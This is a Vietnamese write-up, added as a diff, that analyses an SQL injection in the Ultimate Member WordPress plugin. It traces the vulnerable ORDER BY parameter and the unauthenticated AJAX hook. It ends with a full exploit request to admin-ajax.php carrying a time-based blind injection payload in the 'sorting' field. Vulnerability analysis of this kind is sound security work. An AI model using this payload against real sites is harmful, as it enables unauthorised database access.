@@ -1,0 +1,162 @@
+*Write-up giải thích Wordpress Unlimit member sql injection*
+
+Phân tích luồng gọi trong hàm dính lỗi 
+Theo bài báo viết ta biết được Lỗ hổng nằm ở vị trí này
+
+```php
+$user_ids = $wpdb->get_col(
+    "SELECT SQL_CALC_FOUND_ROWS DISTINCT u.ID
+    {$this->select}
+    FROM {$wpdb->users} AS u
+    {$sql_join}
+    WHERE 1=1 {$sql_where}
+    {$this->having}
+    {$this->sql_order}
+    {$this->sql_limit}"
+);
+```
+
+Ta để ý thấy trước hết $this->sql_order được xử lý bởi 
+
+```php
+$this->sql_order = apply_filters('um_modify_sortby_parameter_meta', 
+$this->sql_order, $sortby);
+```
+
+Mặc dù hàm này  có thực hiện một số thay đổi với biến sql_order nhưng không đáng kể  ( giải thích sau)
+
+
+Sau đó trace ngược code lên thấy 
+
+```php
+ $this->sql_order = " ORDER BY u.{$sortby} {$order} ";
+```
+
+Sau đó trace ngược code lên thấy 
+
+```php
+ $this->sql_order = " ORDER BY u.{$sortby} {$order} ";
+```
+
+Ta có thể thấy Input của ta được sử dụng để cuối cùng đi đến được một SQL command
+
+## Phân tích hàm đặc biệt
+
+Nếu thắc mắc về việc hàm `sanitize_text_field` được sử dụng . Đọc định nghĩa của wordpress cho ta biết rằng hàm này có 4 chức năng như sau  :
+
+```php
+- Kiểm tra UTF-8 không hợp lệ
+- Chuyển đổi ký tự < đơn lẻ thành thực thể
+- Loại bỏ tất cả các thẻ
+- Loại bỏ dấu xuống dòng, tab và khoảng trắng thừa
+- Loại bỏ các ký tự được mã hóa phần trăm
+
+```
+
+Ví dụ : 
+
+`sanitize_text_field` sử dụng hàm sau
+
+```php
+function _sanitize_text_fields( $str, $keep_newlines = false ) {
+	if ( is_object( $str ) || is_array( $str ) ) {
+		return '';
+	}
+
+	$str = (string) $str;
+
+	$filtered = wp_check_invalid_utf8( $str );
+
+	if ( str_contains( $filtered, '<' ) ) {
+		$filtered = wp_pre_kses_less_than( $filtered );
+		// This will strip extra whitespace for us.
+		$filtered = wp_strip_all_tags( $filtered, false );
+
+		/*
+		 * Use HTML entities in a special case to make sure that
+		 * later newline stripping stages cannot lead to a functional tag.
+		 */
+		$filtered = str_replace( "<\n", "&lt;\n", $filtered );
+	}
+
+	if ( ! $keep_newlines ) {
+		$filtered = preg_replace( '/[\r\n\t ]+/', ' ', $filtered );
+	}
+	$filtered = trim( $filtered );
+
+	// Remove percent-encoded characters.
+	$found = false;
+	while ( preg_match( '/%[a-f0-9]{2}/i', $filtered, $match ) ) {
+		$filtered = str_replace( $match[0], '', $filtered );
+		$found    = true;
+	}
+
+	if ( $found ) {
+		// Strip out the whitespace that may now exist after removing percent-encoded characters.
+		$filtered = trim( preg_replace( '/ +/', ' ', $filtered ) );
+	}
+
+	return $filtered;
+}
+```
+
+Nhìn thấy `$filtered` là biến có giá trị bằng  `wp_check_invalid_utf8( $str );` và sau đó được dùng trong code 
+
+```php
+while ( preg_match( '/%[a-f0-9]{2}/i', $filtered, $match ) ) {
+		$filtered = str_replace( $match[0], '', $filtered );
+		$found    = true;
+	}
+```
+
+Ở đây ta hiểu rằng nếu trong string mà ta đưa vào có giá trị khác với utf-8 thì sẽ bị xóa đi bởi vì 
+
+```php
+$filtered = wp_check_invalid_utf8( $str );
+```
+
+## Phân tích luồng gọi đến hàm dính lỗi
+
+Biết rằng hàm dính lỗi là 
+
+```php
+function ajax_get_members() {
+			UM()->check_ajax_nonce();
+			...
+
+}
+```
+
+Trace ngược lại thì ta biết rằng đây chính là hook cần tìm 
+
+```php
+add_action( 'wp_ajax_nopriv_um_get_members', array( UM()->member_directory(), 'ajax_get_members' ) );
+```
+
+Vậy request để khai thác sẽ như sau
+
+```php
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: wp-settings-time-1=1709546041; PHPSESSID=hmvmshj5o8905q72mb3lj3ri5m
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+
+action=um_get_members&directory_id=b9238&nonce=14572977fe&sorting=ID+-sleep(5)--
+```
+
+payload 
+
+```java
+action=um_get_members&directory_id=b9238&nonce=14572977fe&sorting=ID+-sleep(5)--
+```
